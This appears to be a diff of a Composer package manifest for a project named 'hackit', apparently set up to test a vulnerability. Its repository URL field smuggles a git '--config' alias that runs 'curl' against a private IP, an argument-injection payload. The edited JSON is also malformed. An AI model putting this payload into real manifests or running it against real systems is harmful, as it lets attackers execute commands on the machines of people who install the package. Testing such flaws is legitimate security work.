@@ -1,13 +1,17 @@
 {
     "name": "cyberdose/hackit",
-    "description": "This project will be used to test some vulnerabilities",
+    "description": "Hacking project",
     "type": "project",
-    "minimum-stability": "stable",
-    "prefer-stable": true,
+    "require": {
+        "monolog/monolog": "^2.0",
+    },
     "repositories": [
         {
             "type": "vcs",
-            "url": "--config=alias.identify=!curl http://192.168.72.129'"
+            "url": "--config=alias.identify=!curl http://192.168.72.129"
         }
+    ],
+    "minimum-stability": "stable",
+    "license": "MIT"
     ]
 }
